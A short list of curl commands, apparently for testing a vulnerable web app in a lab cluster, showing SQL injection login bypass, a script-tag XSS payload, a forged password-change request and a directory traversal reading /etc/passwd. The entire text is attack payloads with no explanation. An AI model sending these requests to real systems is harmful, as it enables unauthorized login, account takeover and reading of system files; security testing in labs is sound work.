1. SQL Injection
curl -X POST http://<Node-IP>:30008/login \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=' OR 1=1 -- &password=anything"

2. Cross-Site Scripting (XSS)
curl -X POST http://<Node-IP>:30008/comment \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "comment=<script>alert('XSS Attack');</script>"

3. Cross-Site Request Forgery (CSRF)
curl -X GET "http://<Node-IP>:30008/change-password?new_password=hacked" \
--header "Cookie: session=<session_id>" # Replace <session_id> with a valid session ID

4. Directory Traversal
curl -X GET "http://<Node-IP>:30008/?file=../../etc/passwd"

